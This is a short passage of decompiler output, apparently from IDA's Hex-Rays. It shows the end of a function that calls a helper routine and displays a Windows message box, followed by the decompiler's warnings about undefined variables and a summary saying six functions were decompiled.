  HWND v9; // [esp-14h] [ebp-14h]

  sub_402162(v6, v7, v8, v9);
  v4 = GetActiveWindow();
  MessageBoxW(v4, lpText, 0, 0);
  return 0;
}
// 40218A: positive sp value 20 has been found
// 402162: variable 'v6' is possibly undefined
// 402162: variable 'v7' is possibly undefined
// 402162: variable 'v8' is possibly undefined
// 402162: variable 'v9' is possibly undefined

// nfuncs=50 queued=6 decompiled=6 lumina nreq=0 worse=0 better=0
// ALL OK, 6 function(s) have been successfully decompiled
